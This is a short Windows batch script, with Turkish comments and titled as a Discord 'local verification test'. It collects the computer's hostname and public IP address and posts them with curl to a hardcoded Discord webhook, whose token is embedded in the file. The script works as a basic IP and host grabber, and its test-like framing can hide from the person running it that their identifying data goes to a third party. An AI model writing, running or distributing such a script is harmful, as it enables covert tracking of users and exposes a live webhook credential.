@echo off
title Discord Yerel Doğrulama Testi
chcp 65001 >nul

set "WEBHOOK=https://discord.com/api/webhooks/1514159972081074298/mKZ8mYuuUM_c_PN77hBGFX1AhfesXzh7NSi4XTaKkFfM0UlIdw3HSbAJjbqxLepeAdqa"

for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"

:: Dış sunucu bağımlılığı olmadan doğrudan yerel değişkenlerle gönderim
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"**✅ Yerel Baglanti Dogrulandi!**\\n**Bilgisayar:** %HOST%\\n**IP Adresi:** %IP%\"}" "%WEBHOOK%"

echo.
echo İşlem tamamlandı. Eğer token aktifse Discord kanalına mesaj düşmüş olmalıdır.
pause